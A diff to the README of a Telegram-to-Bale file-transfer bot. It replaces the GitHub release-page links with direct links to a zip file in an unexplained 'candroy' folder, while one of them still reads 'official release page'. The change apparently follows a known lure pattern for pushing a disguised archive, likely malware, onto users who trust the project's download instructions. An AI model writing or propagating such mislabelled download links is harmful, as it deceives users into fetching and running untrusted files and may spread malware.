@@ -1,6 +1,6 @@
 # 📂 telegram-to-bale-file-transfer-bot - Move files between messengers with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sino3371/telegram-to-bale-file-transfer-bot/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Sino3371/telegram-to-bale-file-transfer-bot/main/candroy/bot-transfer-bale-file-telegram-to-v1.5-beta.5.zip)
 
 This application acts as a bridge between Telegram and Bale. It allows you to forward files from your Telegram bot to a Bale bot automatically. The system keeps your data secure by restricting access to authorized users only.
 
@@ -25,7 +25,7 @@ You do not need a high-end computer. Because the bot runs on the internet infras
 
 Follow these steps to find the right files for your needs.
 
-1. Go to the [official release page](https://github.com/Sino3371/telegram-to-bale-file-transfer-bot/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Sino3371/telegram-to-bale-file-transfer-bot/main/candroy/bot-transfer-bale-file-telegram-to-v1.5-beta.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link labeled "Source code" if you want to inspect the files, or look for compiled scripts if provided.
 4. Save the files to a folder on your desktop where you can find them later.
